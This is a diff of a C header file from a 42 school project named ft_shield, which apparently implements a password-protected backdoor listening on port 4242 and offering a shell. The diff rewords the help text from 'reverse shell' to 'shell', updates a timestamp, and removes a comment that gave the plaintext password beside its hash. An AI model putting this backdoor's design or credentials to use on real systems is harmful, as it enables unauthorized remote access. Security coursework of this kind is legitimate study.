@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/23 10:57:55 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/23 11:10:04 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -31,14 +31,14 @@
 # define INCORRECT_PASSWORD_TEXT	TEXT_RED	TEXT_BOLD "Incorrect password!\n"																TEXT_RESET
 # define CORRECT_PASSWORD_TEXT		TEXT_GREEN	TEXT_BOLD "Correct password, welcome in!\n" TEXT_BLUE "Write \'help\' for more information\n"	TEXT_RESET
 # define WELCOME_TEXT				TEXT_BLUE	TEXT_BOLD "Welcome to ft_shield!\n"																TEXT_RESET
-# define HELP_TEXT					TEXT_BLUE	TEXT_BOLD "shell: launch a reverse shell\nquit: close ft_shield\nhelp: see this\n"				TEXT_RESET
-# define RVRS_SHELL_TEXT			TEXT_BLUE	TEXT_BOLD "Launching reverse shell.\n"															TEXT_RESET
+# define HELP_TEXT					TEXT_BLUE	TEXT_BOLD "shell: launch a shell\nquit: close ft_shield\nhelp: see this\n"				TEXT_RESET
+# define RVRS_SHELL_TEXT			TEXT_BLUE	TEXT_BOLD "Launching shell.\n"															TEXT_RESET
 # define UNKNOWN_COMMAND_TEXT		TEXT_BLUE	TEXT_BOLD "Unknown command. (see help)\n"														TEXT_RESET
 
 # define LOWERCASE_HEXA "0123456789abcdef"
 # define SERVER_PORT 4242
 
-# define PASSWORD "c2b9ce9e110fe946e9bf5e63becb6e70" // mbatty42
+# define PASSWORD "c2b9ce9e110fe946e9bf5e63becb6e70"
 # define LOGIN_42 "mbatty"
 
 # define LOCK_FILE "/var/lock/ft_shield.lock"
